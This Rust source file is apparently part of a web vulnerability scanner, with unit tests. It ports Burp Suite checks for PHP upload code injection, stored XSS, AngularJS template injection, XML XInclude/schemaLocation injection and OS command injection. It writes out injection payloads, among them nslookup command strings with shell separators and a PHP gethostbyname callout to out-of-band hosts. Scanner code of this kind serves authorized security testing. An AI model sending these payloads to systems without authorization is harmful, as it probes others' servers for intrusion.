//! Burp active-check families ported from the decompiled scanner (D-02):
//!
//! * PHP code injection, echo-based (burp.Zsn3 -> Zgeo.Zv -> Zi0f / Zpza ->
//!   Zxvv), on file-upload insertion points;
//! * Cross-site scripting (stored): Burp's XSS engine (burp.Zi6p.ZZ) run
//!   over an injection request and a later retrieval request;
//! * Client-side template injection (burp.Zrmh with Zmh4 / Zcle / Zg1t /
//!   Zr54 / Zgum);
//! * the out-of-band half of XML injection (burp.Zp7s -> Zsrh with the
//!   Ze_f schemaLocation and Zbiw XInclude payloads built by Zsdg).
//!
//! Every check is a pure function over send closures, so it is unit-testable
//! without network; scan.rs wires them into the per-insertion-point loop.
//! Burp's timing engine (burp.Zwj_, also started by Zsn3) is deliberately
//! not ported.

use super::IpKind;
use crate::util;

fn rnd_from(alphabet: &[u8], n: usize) -> String {
    use rand::Rng;
    let mut g = rand::thread_rng();
    (0..n)
        .map(|_| alphabet[g.gen_range(0..alphabet.len())] as char)
        .collect()
}

/// Random lowercase letters (Burp's Zo1 random strings).
pub(crate) fn rnd_lower(n: usize) -> String {
    rnd_from(b"abcdefghijklmnopqrstuvwxyz", n)
}

/// burp.Zcub's alphabet; Burp's Collaborator-style ids use it too.
const ALNUM36: &str = "abcdefghijklmnopqrstuvwxyz0123456789";

/// A random id in the a-z0-9 alphabet (the id Burp's Zie.ZS hands out when
/// no Collaborator rewrites it).
pub(crate) use webprobe_support::util::rnd_id;

fn body_of(resp: &[u8]) -> String {
    let p = util::parse_http(resp);
    String::from_utf8_lossy(&resp[p.head_len.min(resp.len())..]).into_owned()
}

fn contains(hay: &[u8], needle: &str) -> bool {
    !needle.is_empty() && hay.windows(needle.len()).any(|w| w == needle.as_bytes())
}

/// The Location target of a 3xx response.
pub(crate) fn redirect_location(resp: &[u8]) -> Option<String> {
    let p = util::parse_http(resp);
    let status: u16 = p
        .first
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())?;
    if !(300..400).contains(&status) {
        return None;
    }
    util::get_header(&p.headers, "Location").filter(|l| !l.trim().is_empty())
}

// ============ PHP code injection, echo-based (burp.Zxvv) ============

/// burp.Zcub PHP_PAYLOAD_ONE / PHP_PAYLOAD_TWO shifts (Zcub.<clinit>:
/// `new Zcub(.., 4, 17)` and `(.., 5, 18)`).
pub(crate) const PHP_SHIFT_ONE: usize = 17;
pub(crate) const PHP_SHIFT_TWO: usize = 18;

/// burp.Zcub.Zy: each char of `token` moved `shift` places along a-z0-9.
/// A char outside the alphabet indexes as -1, as in Java's indexOf.
pub(crate) fn zcub_shift(token: &str, shift: usize) -> String {
    token
        .chars()
        .map(|c| {
            let i = ALNUM36.find(c).map(|i| i as i64).unwrap_or(-1);
            ALNUM36.as_bytes()[(i + shift as i64).rem_euclid(36) as usize] as char
        })
        .collect()
}

/// burp.Zg1y.Zr: the last 10 chars of the shifted token.
pub(crate) fn php_marker(token: &str, shift: usize) -> String {
    let s = zcub_shift(token, shift);
    s[s.len().saturating_sub(10)..].to_string()
}

/// burp.Zg1y.ZH: what an evaluating PHP interpreter prints, ONE + "42" + TWO
/// ("42" is Zg1y.a, decoded from Zg1y.<clinit>).
pub(crate) fn php_echo_expected(token: &str) -> String {
    format!(
        "{}42{}",
        php_marker(token, PHP_SHIFT_ONE),
        php_marker(token, PHP_SHIFT_TWO)
    )
}

/// burp.Zxvv.Zg (echo half only): `<?php printf("ONE".(7*6)."TWO");?>`.
#[cfg(test)]
pub(crate) fn php_echo_payload(token: &str) -> String {
    php_payload(token, None)
}

/// burp.Zxvv.Zg: the echo half and, with a Collaborator id, the
/// Collaborator half (Zxvv.ZQ) `gethostbyname("…");` before `?>`.
pub(crate) fn php_payload(token: &str, collaborator: Option<&str>) -> String {
    format!(
        "<?php printf(\"{}\".(7*6).\"{}\");{}?>",
        php_marker(token, PHP_SHIFT_ONE),
        php_marker(token, PHP_SHIFT_TWO),
        collaborator
            .map(|c| format!("gethostbyname(\"{c}\");"))
            .unwrap_or_default()
    )
}

/// burp.Zuxr.ZJ(".", "\"", id) for a DNS Collaborator: `id.` then the
/// Collaborator domain split in half by `"."`, so the name only exists once
/// PHP evaluates the concatenation (`x.oast"."fun` reads as `x.oast.fun`):
/// an echo of the uploaded file never resolves it. `dns_name` is the
/// payload host (`id.domain`). Burp's IP-only Collaborator variant
/// (fsockopen to the server address) does not apply to DNS payloads.
pub(crate) fn php_collaborator_host(id: &str, dns_name: &str) -> String {
    let domain = dns_name.strip_prefix(&format!("{id}.")).unwrap_or(dns_name);
    let half = (0..=domain.len() / 2)
        .rev()
        .find(|&i| domain.is_char_boundary(i))
        .unwrap_or(0);
    format!("{id}.{}\".\"{}", &domain[..half], &domain[half..])
}

/// burp.Ze2v.ZV via Zc3g.Zq: the uploaded file keeps its original name and
/// gains `token[2..12]` plus the ".php" extension (Zxvv's Zxvf type "php").
pub(crate) fn php_upload_filename(original: &str, token: &str) -> String {
    let tail = &token[2.min(token.len())..12.min(token.len())];
    format!("{original}{tail}.php")
}

pub(crate) struct PhpHit {
    pub filename: String,
    pub payload: String,
    pub expected: String,
    /// Index in the redirect chain where the evaluated output appeared (0 =
    /// the upload response itself).
    pub hop: usize,
}

/// Redirects followed after a file upload, like Burp's Zs31.ZW(true).
const PHP_MAX_REDIRECTS: usize = 5;

/// burp.Zsn3.Zw -> Ze2v.Zs -> Zxvv.Zt for one file-upload insertion point:
/// upload `<original><token[2..12]>.php` as text/plain with the printf
/// payload (`send(filename, content_type, content)`), then look for the
/// evaluated ONE42TWO in the response and along its redirect chain
/// (Zcgg.ZI -> Zd / ZF). The raw payload contains `"ONE".(7*6)."TWO"`, so an
/// echo of the upload never matches; only evaluation does.
pub(crate) fn run_php_echo_check<S, F>(
    original_filename: &str,
    token: &str,
    collaborator: Option<&str>,
    mut send: S,
    mut follow: F,
) -> Option<PhpHit>
where
    S: FnMut(&str, &str, &str) -> Option<Vec<u8>>,
    F: FnMut(&str) -> Option<Vec<u8>>,
{
    let filename = php_upload_filename(original_filename, token);
    let payload = php_payload(token, collaborator);
    let expected = php_echo_expected(token);
    let mut resp = send(&filename, "text/plain", &payload)?;
    for hop in 0..=PHP_MAX_REDIRECTS {
        if contains(&resp, &expected) {
            return Some(PhpHit {
                filename,
                payload,
                expected,
                hop,
            });
        }
        let loc = redirect_location(&resp)?;
        resp = follow(&loc)?;
    }
    None
}

// ============ Cross-site scripting (stored) (burp.Zi6p.ZZ) ============

pub(crate) struct StoredXssHit {
    pub payload: String,
    pub context: u8,
    /// Which retrieval request showed the stored payload.
    #[cfg_attr(not(test), allow(dead_code))]
    pub retrieval: usize,
}

/// Stored XSS the way burp.Zi6p runs it in a stored context: the same
/// breakout engine as the reflected check (xss::run_xss_check), but each
/// attempt is "send the payload at the insertion point, then fetch the
/// retrieval request" and the retrieval response is what gets inspected.
/// A plain marker must first be found in one of the `retrievals` responses
/// (stored input, Burp's INPUT_RETRIEVAL_STORED pairing); only that
/// retrieval request is used for the breakout attempts.
/// `retrieve(i)` must only replay safe (GET) requests.
pub(crate) fn run_stored_xss_check<S, R>(
    value: &str,
    retrievals: usize,
    mut send: S,
    mut retrieve: R,
) -> Option<StoredXssHit>
where
    S: FnMut(&str) -> Option<Vec<u8>>,
    R: FnMut(usize) -> Option<Vec<u8>>,
{
    if retrievals == 0 {
        return None;
    }
    let marker = rnd_lower(10);
    send(&format!("{value}{marker}"))?;
    let at = (0..retrievals).find(|&i| retrieve(i).is_some_and(|r| contains(&r, &marker)))?;
    let hit = crate::xss::run_xss_check(value, |p| {
        send(p)?;
        retrieve(at)
    })?;
    Some(StoredXssHit {
        payload: hit.payload,
        context: hit.context,
        retrieval: at,
    })
}

// ============ Client-side template injection (burp.Zrmh) ============

/// burp.Zrmh.Zi, decoded from Zrmh.<clinit>.
pub(crate) const CSTI_EXPR: &str = "{{a=(7*7.0)}}";

/// burp.Zcle.ZA: reflection contexts (xss::classify ids) the check accepts:
/// HTML text (19-22) and every attribute value context (4-15).
fn csti_context_ok(ctx: u8) -> bool {
    matches!(ctx, 4..=15 | 19..=22)
}

const VOID_ELEMENTS: [&str; 14] = [
    "area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param", "source",
    "track", "wbr",
];

/// burp.Zg1t.ZW / ZY: the body ranges inside `ng-app` elements (from the end
/// of the ng-app start tag to the start of its end tag) and inside
/// `ng-non-bindable` elements. Like Zg1t, nesting is counted with a plain
/// start/end stack (names are not matched) and a scope that never closes is
/// not recorded. Comments, void elements and `/>` tags do not count, and
/// script/style contents are skipped.
type ScopeSpans = (Vec<(usize, usize)>, Vec<(usize, usize)>);

pub(crate) fn angular_scopes(body: &str) -> ScopeSpans {
    let lower = body.to_ascii_lowercase();
    let b = body.as_bytes();
    let mut scopes = Vec::new();
    let mut nonbind = Vec::new();
    // stacks of start-tag end offsets; the bottom entry is the scope element
    let mut app: Vec<usize> = Vec::new();
    let mut nb: Vec<usize> = Vec::new();
    let mut i = 0;
    while let Some(off) = body[i..].find('<') {
        let lt = i + off;
        if lower[lt..].starts_with("<!--") {
            i = lower[lt + 4..]
                .find("-->")
                .map(|e| lt + 4 + e + 3)
                .unwrap_or(b.len());
            continue;
        }
        let Some(gt_off) = body[lt..].find('>') else {
            break;
        };
        let gt = lt + gt_off;
        let inner = &lower[lt + 1..gt];
        i = gt + 1;
        if inner.starts_with('!') || inner.starts_with('?') {
            continue;
        }
        let closing = inner.starts_with('/');
        let name: String = inner
            .trim_start_matches('/')
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '-')
            .collect();
        if name.is_empty() {
            continue;
        }
        if closing {
            for (stack, out) in [(&mut app, &mut scopes), (&mut nb, &mut nonbind)] {
                if let Some(start) = stack.pop() {
                    if stack.is_empty() {
                        out.push((start, lt));
                    }
                }
            }
            continue;
        }
        if inner.trim_end().ends_with('/') || VOID_ELEMENTS.contains(&name.as_str()) {
            continue;
        }
        let has_attr = |attr: &str| {
            inner
                .split(|c: char| c.is_ascii_whitespace() || c == '/')
                .skip(1)
                .any(|a| a.split('=').next() == Some(attr))
        };
        // Zg1t: an element carrying the attribute always pushes; any other
        // start tag pushes only inside an open scope.
        for (stack, attr) in [(&mut app, "ng-app"), (&mut nb, "ng-non-bindable")] {
            if has_attr(attr) || !stack.is_empty() {
                stack.push(gt + 1);
            }
        }
        if name == "script" || name == "style" {
            let close = format!("</{name}");
            i = lower[i..].find(&close).map(|e| i + e).unwrap_or(b.len());
        }
    }
    (scopes, nonbind)
}

fn in_ranges(pos: usize, ranges: &[(usize, usize)]) -> bool {
    ranges.iter().any(|(s, e)| pos >= *s && pos <= *e)
}

/// burp.Zcle.Zq: offsets of `marker` reflections that sit in an accepted
/// context inside an ng-app scope and outside any ng-non-bindable element.
fn scoped_reflections(body: &str, marker: &str) -> Vec<usize> {
    let (scopes, nonbind) = angular_scopes(body);
    if scopes.is_empty() {
        return Vec::new();
    }
    body.match_indices(marker)
        .map(|(p, _)| p)
        .filter(|&p| {
            in_ranges(p, &scopes)
                && !in_ranges(p, &nonbind)
                && csti_context_ok(crate::xss::classify(body, p))
        })
        .collect()
}

/// burp.Zr54.ZJ `(AngularJS v[0-9.]+)` (from the string map) over a script.
pub(crate) fn angular_version_in(script: &str) -> Option<String> {
    let mut from = 0;
    while let Some(i) = script[from..].find("AngularJS v") {
        let at = from + i;
        let rest = &script[at + 11..];
        let n = rest
            .find(|c: char| !(c.is_ascii_digit() || c == '.'))
            .unwrap_or(rest.len());
        if n > 0 {
            return Some(script[at..at + 11 + n].to_string());
        }
        from = at + 11;
    }
    None
}

/// The `src` of every `<script src=...>` start tag, in page order.
pub(crate) fn script_srcs(body: &str) -> Vec<String> {
    let lower = body.to_ascii_lowercase();
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(i) = lower[from..].find("<script") {
        let at = from + i;
        let end = lower[at..].find('>').map(|e| at + e).unwrap_or(lower.len());
        let tag = &body[at..end];
        let tl = &lower[at..end];
        if let Some(s) = tl.find("src=") {
            let v = &tag[s + 4..];
            let src = match v.chars().next() {
                Some(q @ ('"' | '\'')) => v[1..].split(q).next().unwrap_or(""),
                _ => v
                    .split(|c: char| c.is_ascii_whitespace())
                    .next()
                    .unwrap_or(""),
            };
            if !src.trim().is_empty() {
                out.push(src.trim().to_string());
            }
        }
        from = end.max(at + 1);
    }
    out
}

pub(crate) struct CstiHit {
    pub payload: String,
    /// The HTML-decoded reflected span holding the template expression.
    pub reflection: String,
    /// "AngularJS vX.Y.Z" when a page script identified the framework
    /// (Zgum.Zk: Firm); None otherwise (Zgum.Zy: Tentative).
    pub angular_version: Option<String>,
}

impl CstiHit {
    pub(crate) fn confidence(&self) -> &'static str {
        if self.angular_version.is_some() {
            "Firm"
        } else {
            "Tentative"
        }
    }
}

/// burp.Zrmh.Zw: for each plain reflection type (replace, then append,
/// Zwe8.PLAIN_REFLECTION_TYPES), the plain marker must reflect in an
/// accepted context inside an ng-app scope (Zrmh.Z_); only then is
/// `m1{{a=(7*7.0)}}m2` sent (Zmh4.ZT). It is reported when, for a scoped
/// reflection of m1, the HTML-decoded span m1..m2 still contains the
/// expression (Zmh4.Zf): the template engine would evaluate it. Page
/// scripts are then fetched (`fetch_script(src)`) for an AngularJS version
/// banner (Zr54.ZK), which raises the confidence to Firm.
pub(crate) fn run_csti_check<S, F>(value: &str, mut send: S, mut fetch_script: F) -> Option<CstiHit>
where
    S: FnMut(&str) -> Option<Vec<u8>>,
    F: FnMut(&str) -> Option<Vec<u8>>,
{
    for append in [false, true] {
        let marker = rnd_lower(10);
        let plain = if append {
            format!("{value}{marker}")
        } else {
            marker.clone()
        };
        let Some(resp) = send(&plain) else { continue };
        if scoped_reflections(&body_of(&resp), &marker).is_empty() {
            continue;
        }
        let (m1, m2) = (rnd_lower(5), rnd_lower(5));
        let payload = format!("{m1}{CSTI_EXPR}{m2}");
        let probe = if append {
            format!("{value}{payload}")
        } else {
            payload
        };
        let Some(resp) = send(&probe) else { continue };
        let body = body_of(&resp);
        for pos in scoped_reflections(&body, &m1) {
            let Some(end) = body[pos..].find(&m2) else {
                continue;
            };
            let span = util::html_decode(&body[pos..pos + end + m2.len()]);
            if span.contains(CSTI_EXPR) {
                let angular_version = script_srcs(&body).iter().find_map(|src| {
                    fetch_script(src).and_then(|s| angular_version_in(&String::from_utf8_lossy(&s)))
                });
                return Some(CstiHit {
                    payload: probe,
                    reflection: span,
                    angular_version,
                });
            }
        }
    }
    None
}

// ============ XML injection, out-of-band half (burp.Zp7s -> Zsrh) ============

/// burp.Zp7s.Zh: the check skips HTTP header points (Zxmw.Zl lists HEADER
/// and the parameter-name kinds) and values that already hold '<' or '>'
/// (Zp7s.ZQ).
pub(crate) fn xml_oob_applies(kind: &IpKind, value: &str) -> bool {
    let type_ok = match kind {
        IpKind::Header | IpKind::ParamName(_) => false,
        IpKind::Query
        | IpKind::Body
        | IpKind::Json(_)
        | IpKind::Multipart { .. }
        | IpKind::Cookie
        | IpKind::PathFolder(_)
        | IpKind::PathFilename(_)
        | IpKind::EntireBody
        | IpKind::XmlParam { .. }
        | IpKind::XmlTag { .. }
        | IpKind::XmlAttr { .. }
        | IpKind::Base64 { .. } => true,
    };
    type_ok && !value.contains(['<', '>'])
}

/// burp.Ze_f.Zr wrapped by Zsdg.Zl for a value without markup: a random
/// three-letter root whose schemaLocation points at the Collaborator host.
pub(crate) fn xml_oob_xsd_payload(tag: &str, host: &str) -> String {
    format!(
        "<{tag} xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://{host}/{tag}.xsd\">{tag}</{tag}>"
    )
}

/// burp.Zbiw.ZK wrapped by Zsdg.Zu: an XInclude of the Collaborator host.
pub(crate) fn xml_oob_xinclude_payload(tag: &str, host: &str) -> String {
    format!("<{tag} xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://{host}/foo\"/></{tag}>")
}

/// burp.Zp7s.Zw, Collaborator half: send the schemaLocation payload, then
/// the XInclude payload (Zsrh over Ze_f, then over Zbiw), each replacing the
/// value. `xsd` / `xi` are (Collaborator id, host). Returns the (id, payload)
/// pairs sent; the caller registers each id so a later interaction raises
/// "XML injection" (Zh9s -> Zc3f -> Zs_g.XML_INJECTION -> Zuzl -> Zp9s.ZC:
/// medium severity, certain confidence).
pub(crate) fn run_xml_oob_check<S>(
    kind: &IpKind,
    value: &str,
    xsd: Option<(&str, &str)>,
    xi: Option<(&str, &str)>,
    mut send: S,
) -> Vec<(String, String)>
where
    S: FnMut(&str) -> Option<Vec<u8>>,
{
    let mut sent = Vec::new();
    if !xml_oob_applies(kind, value) {
        return sent;
    }
    let tag = rnd_lower(3);
    let probes = [
        xsd.map(|(id, host)| (id, xml_oob_xsd_payload(&tag, host))),
        xi.map(|(id, host)| (id, xml_oob_xinclude_payload(&tag, host))),
    ];
    for (id, payload) in probes.into_iter().flatten() {
        if send(&payload).is_some() {
            sent.push((id.to_string(), payload));
        }
    }
    sent
}

/// OS command injection, Collaborator half (burp.Zc99.Zu): `nslookup -q=cname`
/// payloads for the Collaborator domain, each with its own id. At normal and
/// thorough speed the replace payload (Ze2n mode 0, replaces the value), the
/// pipe and the ampersand payloads (mode 1, appended) run, then, as at fast
/// speed, the combined payload (Zwyn falls through from cases 1-2 to 3).
/// Returns (slot, payload with `%s`/`%1$s` = domain + ".", append?).
pub(crate) fn os_cmd_payloads(
    speed: crate::scan::ScanSpeed,
    mut domain_for: impl FnMut(&str) -> Option<String>,
) -> Vec<(&'static str, String, bool)> {
    const ALL: [(&str, &str, bool); 4] = [
        ("cmd0", "nslookup -q=cname %s&", false),
        ("cmd1", "|nslookup -q=cname %s&", true),
        ("cmd2", "'\"`0&nslookup -q=cname %s&`'", true),
        (
            "cmd3",
            "&nslookup -q=cname %s&'\\\"`0&nslookup -q=cname %1$s&`'",
            true,
        ),
    ];
    let from = if matches!(speed, crate::scan::ScanSpeed::Fast) {
        3
    } else {
        0
    };
    ALL[from..]
        .iter()
        .filter_map(|(slot, fmt, append)| {
            let d = format!("{}.", domain_for(slot)?);
            Some((*slot, fmt.replace("%1$s", &d).replace("%s", &d), *append))
        })
        .collect()
}

#[cfg(test)]
mod tests {
    #[test]
    fn os_cmd_payloads_follow_zc99() {
        use crate::scan::ScanSpeed;
        let d = |slot: &str| Some(format!("{slot}.oob.invalid"));
        let normal = os_cmd_payloads(ScanSpeed::Normal, d);
        let got: Vec<(&str, &str, bool)> = normal
            .iter()
            .map(|(s, p, a)| (*s, p.as_str(), *a))
            .collect();
        assert_eq!(
            got,
            [
                ("cmd0", "nslookup -q=cname cmd0.oob.invalid.&", false),
                ("cmd1", "|nslookup -q=cname cmd1.oob.invalid.&", true),
                ("cmd2", "'\"`0&nslookup -q=cname cmd2.oob.invalid.&`'", true),
                ("cmd3", "&nslookup -q=cname cmd3.oob.invalid.&'\\\"`0&nslookup -q=cname cmd3.oob.invalid.&`'", true),
            ]
        );
        let fast = os_cmd_payloads(ScanSpeed::Fast, d);
        assert_eq!(fast.iter().map(|f| f.0).collect::<Vec<_>>(), ["cmd3"]);
        assert!(
            os_cmd_payloads(ScanSpeed::Thorough, |_| None).is_empty(),
            "no Collaborator, no probe"
        );
    }

    use super::*;
    use std::cell::RefCell;

    fn ok(body: &str) -> Option<Vec<u8>> {
        Some(format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{body}").into_bytes())
    }

    /// A toy PHP interpreter for `printf("A".(7*6)."B");` inside `<?php ?>`.
    fn eval_php(src: &str) -> String {
        let Some(code) = src
            .strip_prefix("<?php ")
            .and_then(|s| s.strip_suffix("?>"))
        else {
            return src.to_string();
        };
        let Some(args) = code
            .strip_prefix("printf(")
            .and_then(|s| s.strip_suffix(");"))
        else {
            return src.to_string();
        };
        args.split('.')
            .map(|t| {
                if t == "(7*6)" {
                    "42".to_string()
                } else {
                    t.trim_matches('"').to_string()
                }
            })
            .collect()
    }

    #[test]
    fn php_markers_follow_zcub_and_zg1y() {
        assert_eq!(zcub_shift("abc", PHP_SHIFT_ONE), "rst");
        assert_eq!(zcub_shift("9", PHP_SHIFT_ONE), "q", "35+17 wraps to 16");
        assert_eq!(
            zcub_shift("-", PHP_SHIFT_TWO),
            "r",
            "a char outside a-z0-9 indexes as -1"
        );
        let token = "abcdefghijklmnopqrst";
        assert_eq!(
            php_marker(token, PHP_SHIFT_ONE),
            zcub_shift("klmnopqrst", PHP_SHIFT_ONE)
        );
        assert_eq!(
            php_echo_payload(token),
            format!(
                "<?php printf(\"{}\".(7*6).\"{}\");?>",
                php_marker(token, 17),
                php_marker(token, 18)
            )
        );
        // burp.Zxvv.ZQ / Zuxr.ZJ: the Collaborator name split by `"."` so it
        // only exists once PHP evaluates it.
        assert_eq!(
            php_collaborator_host("abc123", "abc123.oast.fun"),
            "abc123.oast\".\".fun"
        );
        assert_eq!(
            php_payload(token, Some("abc123.oast\".\".fun")),
            format!(
                "<?php printf(\"{}\".(7*6).\"{}\");gethostbyname(\"abc123.oast\".\".fun\");?>",
                php_marker(token, 17),
                php_marker(token, 18)
            )
        );
        assert_eq!(
            php_echo_expected(token),
            format!("{}42{}", php_marker(token, 17), php_marker(token, 18))
        );
        assert_eq!(php_upload_filename("cv.pdf", token), "cv.pdfcdefghijkl.php");
    }

    #[test]
    fn php_echo_check_needs_evaluation() {
        let token = rnd_id(20);
        // Upload handler that includes the uploaded file: printf runs.
        let evaluates = |name: &str, ct: &str, content: &str| {
            assert!(name.ends_with(".php") && ct == "text/plain");
            ok(&format!("<p>uploaded: {}</p>", eval_php(content)))
        };
        let hit = run_php_echo_check("a.txt", &token, None, evaluates, |_| None)
            .expect("evaluated printf is PHP code injection");
        assert_eq!(hit.hop, 0);
        assert!(hit.payload.contains("(7*6)") && !hit.payload.contains(&hit.expected));
        // Handler that only echoes the upload back: no evaluation, no issue.
        let echoes = |_: &str, _: &str, content: &str| ok(&format!("<pre>{content}</pre>"));
        assert!(run_php_echo_check("a.txt", &token, None, echoes, |_| None).is_none());
        // The evaluated output only appears after the post-upload redirect.
        let redirects = |_: &str, _: &str, content: &str| {
            let out = eval_php(content);
            Some(
                format!("HTTP/1.1 302 Found\r\nLocation: /uploads/view?o={out}\r\n\r\n")
                    .into_bytes(),
            )
        };
        let follow = |loc: &str| ok(&format!("view {}", loc.split("o=").nth(1).unwrap_or("")));
        assert_eq!(
            run_php_echo_check("a.txt", &token, None, redirects, follow).map(|h| h.hop),
            Some(0),
            "the Location header itself carries the output"
        );
        let redirects_clean = |_: &str, _: &str, _: &str| {
            Some(b"HTTP/1.1 303 See Other\r\nLocation: /done\r\n\r\n".to_vec())
        };
        let token2 = token.clone();
        let follow_eval = move |_: &str| ok(&eval_php(&php_echo_payload(&token2)));
        assert_eq!(
            run_php_echo_check("a.txt", &token, None, redirects_clean, follow_eval).map(|h| h.hop),
            Some(1)
        );
    }

    #[test]
    fn stored_xss_needs_storage_and_a_breakout_in_the_later_page() {
        // A guestbook: the POST stores the comment, the GET page renders it.
        let store = RefCell::new(String::new());
        let send = |v: &str| {
            *store.borrow_mut() = v.to_string();
            ok("thanks")
        };
        let page = |_: usize| {
            ok(&format!(
                "<html><body><p>{}</p></body></html>",
                store.borrow()
            ))
        };
        let hit = run_stored_xss_check("hello", 1, send, page)
            .expect("stored unencoded comment is stored XSS");
        assert_eq!(hit.retrieval, 0);
        assert_eq!(hit.context, 19);
        // The page HTML-encodes the stored comment: stored, but not XSS.
        let store = RefCell::new(String::new());
        let send = |v: &str| {
            *store.borrow_mut() = v.to_string();
            ok("thanks")
        };
        let encoded = |_: usize| {
            ok(&format!(
                "<p>{}</p>",
                store.borrow().replace('<', "&lt;").replace('>', "&gt;")
            ))
        };
        assert!(run_stored_xss_check("hello", 1, send, encoded).is_none());
        // Reflected only, never stored: one injection, no breakout attempts.
        let sends = RefCell::new(0);
        let reflect = |v: &str| {
            *sends.borrow_mut() += 1;
            ok(&format!("<p>{v}</p>"))
        };
        assert!(run_stored_xss_check("hello", 2, reflect, |_| ok("<p>static</p>")).is_none());
        assert_eq!(*sends.borrow(), 1);
        // The stored value shows on the second retrieval page only.
        let store = RefCell::new(String::new());
        let send = |v: &str| {
            *store.borrow_mut() = v.to_string();
            ok("")
        };
        let pages = |i: usize| {
            if i == 1 {
                ok(&format!("<div title=\"{}\">x</div>", store.borrow()))
            } else {
                ok("home")
            }
        };
        let hit = run_stored_xss_check("hello", 2, send, pages).unwrap();
        assert_eq!((hit.retrieval, hit.context), (1, 4));
    }

    #[test]
    fn angular_scopes_follow_zg1t() {
        let body = "<html><body><div ng-app><p>in</p><span ng-non-bindable>raw</span><br>tail</div>out</body></html>";
        let (scopes, nb) = angular_scopes(body);
        assert_eq!(scopes.len(), 1);
        let (s, e) = scopes[0];
        assert!(
            body[s..e].contains("in") && body[s..e].contains("tail") && !body[s..e].contains("out")
        );
        assert_eq!(nb.len(), 1);
        assert_eq!(&body[nb[0].0..nb[0].1], "raw");
        // No ng-app attribute (a class name is not enough): no scope.
        assert!(angular_scopes("<div class=\"ng-app\">x</div>").0.is_empty());
        // An unclosed scope is not recorded, as in Zg1t.
        assert!(angular_scopes("<div ng-app><p>x</p>").0.is_empty());
        assert_eq!(
            angular_version_in("/*\n @license AngularJS v1.4.7\n*/"),
            Some("AngularJS v1.4.7".into())
        );
        assert_eq!(angular_version_in("AngularJS vX"), None);
        assert_eq!(
            script_srcs(
                "<script src=\"/a.js\"></script><SCRIPT src='b.js'></SCRIPT><script>x</script>"
            ),
            vec!["/a.js", "b.js"]
        );
    }

    #[test]
    fn csti_check_follows_zrmh() {
        let page = |v: &str| {
            ok(&format!("<html ng-app><body><p>Hello {v}</p><script src=\"/js/angular.min.js\"></script></body></html>"))
        };
        let hit =
            run_csti_check("bob", page, |_| None).expect("unencoded expression inside ng-app");
        assert!(hit.reflection.contains(CSTI_EXPR));
        assert_eq!(hit.confidence(), "Tentative");
        let fetch = |src: &str| {
            (src == "/js/angular.min.js").then(|| b"/* AngularJS v1.5.0 (c) Google */".to_vec())
        };
        let hit = run_csti_check("bob", page, fetch).unwrap();
        assert_eq!(
            (hit.angular_version.as_deref(), hit.confidence()),
            (Some("AngularJS v1.5.0"), "Firm")
        );
        // HTML-escaped braces still decode to the expression (Zsh.Zz first).
        let escaped = |v: &str| {
            ok(&format!(
                "<div ng-app><p>{}</p></div>",
                v.replace('{', "&#123;").replace('}', "&#125;")
            ))
        };
        assert!(run_csti_check("bob", escaped, |_| None).is_some());
        // Negative cases: no Angular scope, a non-bindable region, or the
        // template characters stripped by the application.
        let plain = |v: &str| ok(&format!("<html><body><p>Hello {v}</p></body></html>"));
        assert!(run_csti_check("bob", plain, |_| None).is_none());
        let nonbind = |v: &str| ok(&format!("<div ng-app><p ng-non-bindable>{v}</p></div>"));
        assert!(run_csti_check("bob", nonbind, |_| None).is_none());
        let stripped = |v: &str| {
            ok(&format!(
                "<div ng-app><p>{}</p></div>",
                v.replace(['{', '}'], "")
            ))
        };
        assert!(run_csti_check("bob", stripped, |_| None).is_none());
    }

    /// The host an XML parser with external resolution enabled would contact
    /// for a payload: the XInclude href or the schemaLocation document.
    fn resolving_parser(xml: &str) -> Option<String> {
        let url = if let Some(i) = xml.find("<xi:include href=\"") {
            &xml[i + 18..]
        } else {
            let i = xml.find("xsi:schemaLocation=\"")?;
            xml[i + 20..].split_whitespace().nth(1)?
        };
        Some(
            url.trim_start_matches("http://")
                .split('/')
                .next()?
                .to_string(),
        )
    }

    #[test]
    fn xml_oob_payloads_follow_zsdg() {
        assert_eq!(
            xml_oob_xinclude_payload("abc", "id1.oast.example"),
            "<abc xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://id1.oast.example/foo\"/></abc>"
        );
        assert_eq!(
            xml_oob_xsd_payload("abc", "id2.oast.example"),
            "<abc xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://id2.oast.example/abc.xsd\">abc</abc>"
        );
        assert!(xml_oob_applies(&IpKind::Query, "bob"));
        assert!(
            !xml_oob_applies(&IpKind::Header, "bob"),
            "Zxmw.Zl: no header points"
        );
        assert!(
            !xml_oob_applies(&IpKind::Body, "<a>b</a>"),
            "Zp7s.ZQ: no values with markup"
        );
    }

    #[test]
    fn xml_oob_check_reaches_the_collaborator_only_through_an_xml_parser() {
        let xsd = ("id-xsd", "idxsd.oast.example");
        let xi = ("id-xi", "idxi.oast.example");
        // Vulnerable: the value lands in a server-side XML document whose
        // parser resolves XInclude and schema locations.
        let contacted = RefCell::new(Vec::new());
        let parse = |v: &str| {
            if let Some(h) = resolving_parser(v) {
                contacted.borrow_mut().push(h);
            }
            ok("ok")
        };
        let sent = run_xml_oob_check(&IpKind::Body, "bob", Some(xsd), Some(xi), parse);
        assert_eq!(
            sent.iter().map(|(id, _)| id.as_str()).collect::<Vec<_>>(),
            vec!["id-xsd", "id-xi"],
            "schema first, then XInclude"
        );
        assert_eq!(
            *contacted.borrow(),
            vec![xsd.1.to_string(), xi.1.to_string()]
        );
        // Safe: the value is stored as text, nothing is contacted.
        let contacted = RefCell::new(Vec::<String>::new());
        let text = |_: &str| ok("ok");
        let sent = run_xml_oob_check(&IpKind::Query, "bob", Some(xsd), Some(xi), text);
        assert_eq!(sent.len(), 2);
        assert!(contacted.borrow().is_empty());
        // Not applicable: header points send nothing.
        assert!(
            run_xml_oob_check(&IpKind::Header, "bob", Some(xsd), Some(xi), |_| panic!(
                "no probe on a header point"
            ))
            .is_empty()
        );
    }
}
